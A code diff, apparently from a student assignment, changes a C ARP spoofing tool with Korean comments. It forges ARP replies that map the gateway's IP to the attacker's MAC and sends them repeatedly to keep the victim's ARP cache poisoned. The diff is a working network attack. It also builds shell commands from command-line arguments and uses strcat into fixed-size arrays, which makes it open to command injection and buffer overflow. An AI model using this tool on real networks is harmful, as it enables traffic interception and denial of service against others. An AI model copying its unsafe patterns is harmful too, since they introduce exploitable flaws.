@@ -176,32 +176,29 @@ int main(int argc, char* argv[]) {
     char *senderMAC = commandSplitter(senderArpCommand, 3);
     // 만일 대상을 찾지 못했다면
     if(senderMAC == NULL || strcmp(senderMAC, "<incomplete>") == 0) {
-        // 대상을 찾지 못했을 경우, 본인 PC MAC을 입력합니다.
-        // 보통 /sys/class/net/ens33/address 경로에 저장됩니다.
-        char macCommand[] = "cat /sys/class/net/";
-        strcat(macCommand, argv[1]);
-        strcat(macCommand, "/address");
-        senderMAC = exec(macCommand);
-        // 가져올 때 끝에 개행문자가 붙으므로, 마지막 한 자를 제거합니다.
-        senderMAC[strlen(senderMAC) - 1] = '\0';
-        printf("Sender not found...\n");
-        printf("Set Sender to this PC...\n");
-    }
-	
-    // 대상 IP는 3번째 인자로 설정합니다.
-    char *targetIp = argv[3];
-    // 대상에 대한 arp 테이블을 확인하는 명령어를 만듭니다.
-    // arp -a | grep argv[3]
-    char targetArpCommand[] = "arp -a | grep ";
-    strcat(targetArpCommand, argv[3]);
-    // 대상의 MAC 주소를 위 명령어를 통해 가져옵니다.
-    char *targetMAC = commandSplitter(targetArpCommand, 3);
-    // 만일 대상을 찾지 못했다면
-    if(targetMAC == NULL || strcmp(targetMAC, "<incomplete>") == 0) {
         // 대상을 찾지 못했다고 알리며, 프로그램을 종료합니다.
         printf("Target not found...\n");
         return -1;
     }
+	
+    // 본인 PC MAC을 가져옵니다.
+    // 보통 /sys/class/net/ens33/address 경로에 저장됩니다.
+    char macCommand[] = "cat /sys/class/net/";
+    strcat(macCommand, argv[1]);
+    strcat(macCommand, "/address");
+    char *myMAC = exec(macCommand);
+    // 가져올 때 끝에 개행문자가 붙으므로, 마지막 한 자를 제거합니다.
+    myMAC[strlen(myMAC) - 1] = '\0';
+		
+    // 본인 PC의 IP를 가져옵니다.
+    char myIpCommand[] = "ifconfig ";
+    strcat(myIpCommand, argv[1]);
+    strcat(myIpCommand, " | grep inet");
+    char *myIp  = commandSplitter(myIpCommand, 1);
+
+    // 대상 IP는 3번째 인자로 설정합니다.
+    char *targetIp = argv[3];
+    
     // 게이트웨이의 IP 값을 명령어를 통해 가져옵니다. 가져올 때, 괄호가 붙으므로 cut을 통해 떼어냅니다.
     // arp -a | grep _gateway | cut -f 2 -d '(' | cut -f 1 -d ')'
     char *gatewayIp = exec("arp -a | grep _gateway | cut -f 2 -d '(' | cut -f 1 -d ')'");
@@ -214,9 +211,8 @@ int main(int argc, char* argv[]) {
     printf("Sender IP : %s (len : %d)\n", senderIp, strlen(senderIp));
     printf("Sender MAC : %s (len : %d)\n", senderMAC, strlen(senderMAC));
     printf("Target IP : %s (len : %d)\n", targetIp, strlen(targetIp));
-    printf("Target MAC : %s (len : %d)\n", targetMAC, strlen(targetMAC));
-    printf("Gateway IP : %s (len : %d)\n", gatewayIp, strlen(gatewayIp));
-    printf("Gateway MAC : %s (len : %d)\n", gatewayMAC, strlen(gatewayMAC));
+    printf("My IP : %s (len : %d)\n", myIp, strlen(myIp));
+    printf("My MAC : %s (len : %d)\n", myMAC, strlen(myMAC));
 
     // 디바이스로 1번째 인자에 들어있는 값을 설정하고,
     char* dev = argv[1];
@@ -235,8 +231,13 @@ int main(int argc, char* argv[]) {
     EthArpPacket packet;
 
     // 공격 대상과 내 PC의 네트워크 정보들을 구조체에 맞게 기입합니다.
-    packet.eth_.dmac_ = Mac(targetMAC);
-    packet.eth_.smac_ = Mac(senderMAC);
+    packet.eth_.dmac_ = Mac(senderMAC);
+    packet.eth_.smac_ = Mac(myMAC);
+    packet.arp_.smac_ = Mac(myMAC);
+    packet.arp_.sip_ = htonl(Ip(gatewayIp));
+    packet.arp_.tmac_ = Mac(senderMAC);
+    packet.arp_.tip_ = htonl(Ip(senderIp));
+    
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -244,12 +245,8 @@ int main(int argc, char* argv[]) {
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = Mac(senderMAC);
-    packet.arp_.sip_ = htonl(Ip(gatewayIp));
-    packet.arp_.tmac_ = Mac(targetMAC);
-    packet.arp_.tip_ = htonl(Ip(targetIp));
     
-    printf("\n\n[Annoying %s...]\n", targetIp);
+    printf("\n\n[Annoying %s...]\n", senderIp);
     // ARP 패킷을 지속적으로 보내어
     // 상대 ARP테이블이 새로고침 되더라도
     // 다시 오염되게 만듭니다.
